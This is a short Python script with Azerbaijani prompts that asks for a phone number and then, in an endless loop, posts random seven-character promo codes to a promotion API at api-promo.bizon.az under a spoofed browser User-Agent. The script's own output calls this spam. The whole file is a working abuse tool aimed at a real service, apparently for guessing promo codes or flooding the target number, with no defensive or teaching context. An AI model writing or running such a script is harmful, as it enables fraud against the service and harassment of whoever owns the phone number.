import requests
import random
import string
import time

url = "https://api-promo.bizon.az/submit"

def random_code(length=7):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

phone = input("Nomreni daxil et: ").strip()

print(f"\n[{phone}] ucun spam basladi... Ctrl+C ile dayandir\n")

while True:
    payload = {
        "phone": phone,
        "code": random_code(7)
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[{time.strftime('%H:%M:%S')}] CODE: {payload['code']} | STATUS: {r.status_code} | RESP: {r.text[:100]}")
    except Exception as e:
        print(f"XETA: {e}")

    time.sleep(5)
